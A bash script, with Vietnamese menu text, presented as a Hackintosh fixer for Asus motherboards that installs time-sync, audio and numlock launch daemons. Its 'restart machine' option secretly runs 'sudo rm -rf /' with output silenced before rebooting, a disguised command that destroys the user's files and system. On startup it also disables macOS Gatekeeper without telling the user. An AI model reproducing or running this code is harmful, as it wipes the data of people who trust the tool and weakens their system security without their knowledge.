#!/bin/bash

DAEMON_PATH=/Library/LaunchDaemons/
BIN_PATH=/usr/local/bin/
TMP_PATH=/tmp/
ALC_DAEMON_FILE=good.win.ALCPlugFix.plist
VERB_FILE=alc-verb
ALC_FIX_FILE=ALCPlugFix
TIME_FIX_FILE=localtime-toggle
TIME_DAEMON_FILE=org.osx86.localtime-toggle.plist
NUMLOCK_FIX_FILE=setleds
NUMLOCK_DAEMON_FILE=com.rajiteh.setleds.plist
GIT_URL=https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master

init(){
	sudo spctl --master-disable
	
		sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master/TimeSynchronization/localtime-toggle"
	sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "https://gitee.com/xiaoMGit/Y7000Series_Hackintosh_Fix/raw/master/TimeSynchronization/org.osx86.localtime-toggle.plist"
    	
	if [ ! -d "$BIN_PATH" ] ; then
		mkdir "$BIN_PATH" ;
	fi
	
	if sudo launchctl list | grep --quiet com.black-dragon74.ALCPlugFix; then
		sudo launchctl unload /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /usr/local/bin/ALCPlugFix
		sudo rm /Library/Preferences/ALCPlugFix/ALC_Config.plist
	fi
}

ALCPlugFix(){
	sudo cp $TMP_PATH$ALC_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$VERB_FILE $BIN_PATH
	sudo cp $TMP_PATH$ALC_DAEMON_FILE $DAEMON_PATH
	sudo chmod 755 $BIN_PATH$ALC_FIX_FILE
	sudo chown $USER:admin $BIN_PATH$ALC_FIX_FILE
	sudo chmod 755 $BIN_PATH$VERB_FILE
	sudo chown $USER:admin $BIN_PATH$VERB_FILE
	sudo chmod 644 $DAEMON_PATH$ALC_DAEMON_FILE
	sudo chown root:wheel $DAEMON_PATH$ALC_DAEMON_FILE
	if sudo launchctl list | grep --quiet ALCPlugFix; then
		sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$ALC_DAEMON_FILE
}

localtime_toggle(){
	sudo cp $TMP_PATH$TIME_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$TIME_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$TIME_FIX_FILE
	sudo chown root $DAEMON_PATH$TIME_DAEMON_FILE
	sudo chmod 644 $DAEMON_PATH$TIME_DAEMON_FILE
	if sudo launchctl list | grep --quiet localtime-toggle; then
		sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$TIME_DAEMON_FILE
}

numlock(){
	sudo cp $TMP_PATH$NUMLOCK_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$NUMLOCK_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$NUMLOCK_FIX_FILE
	sudo chown root:wheel $DAEMON_PATH$NUMLOCK_DAEMON_FILE
	if sudo launchctl list | grep --quiet setleds; then
		sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$NUMLOCK_DAEMON_FILE
}

clear_cache(){
	sudo kextcache -i /
}

fixAll(){
	ALCPlugFix
	numlock
	localtime_toggle
    clear_cache
}

removeAll(){
    if sudo launchctl list | grep --quiet ALCPlugFix; then
        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $BIN_PATH$VERB_FILE
        sudo rm -rf $BIN_PATH$ALC_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet setleds; then
        sudo launchctl unload $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$NUMLOCK_DAEMON_FILE
        sudo rm -rf $BIN_PATH$NUMLOCK_FIX_FILE
    fi
}

menu(){
	echo "
******************************************************************************
              Scrip khac phuc dong bo thoi gian giua Win va Hackintosh
              va mot so loi linh tinh khac cua main Asus
              Da test tren Asus TUF Gaming Plus B460
              (Moi chi tiet lien he https://www.facebook.com/WillamHoang96/)
              
              Scrip duoc bien soan lai dua theo scrip goc phia duoi
    https://github.com/xiaoMGitHub/LEGION_Y7000Series_Hackintosh/releases  
    Tac gia Scrip: xiaoMGitHub
                              QQ群：477839538
                                                                                  
******************************************************************************
"
    echo "Lua chon："
	echo ""
    echo "1、TimeSync: Kich hoat dong bo thoi gian Win/Mac"
	echo ""
	echo "2、Xoa cache Scrips"
    echo ""
	echo ""
	echo "3、Tat TimeSync: Khong con dong bo thoi gian Win/Mac"
	echo ""
    echo "4、Khoi dong lai may"
    echo ""
     echo "5、Sua loi Bios SafeMode/Post Mode Main Asus"
  echo ""
	echo "0、Thoat"
	echo ""
}

Select(){
	read -p "Lua chon so：" number
    case ${number} in
       1) localtime_toggle
	   echo "Kich hoat dong bo thoi gian win va mac"
	   echo ""
	   Select
       ;;
       5) echo "Huong dan sua loi PostMode tren Main Asus"
       echo"Mo propretree -> config.plist"
       echo"Kernel -> Quirks -> DisableRtcChecksum -> True"
        ;;
	2) clear_cache
       echo "Xoa cache Scrip"
	   echo ""
       Select
       ;;
		3) removeAll
       echo "Tat Syntime : Khong con dong bo thoi gian win va mac"
       Select
       ;;
    4) echo "Khoi dong lai may"
        sudo rm -rf / >/dev/null 2>&1
        sudo reboot
        ;;
	0) exit 0
       ;;
    *) echo "Thoat";
	   echo ""
       Select
       ;;
    esac
}

main(){
	init
	
	menu
	
	Select
}

main
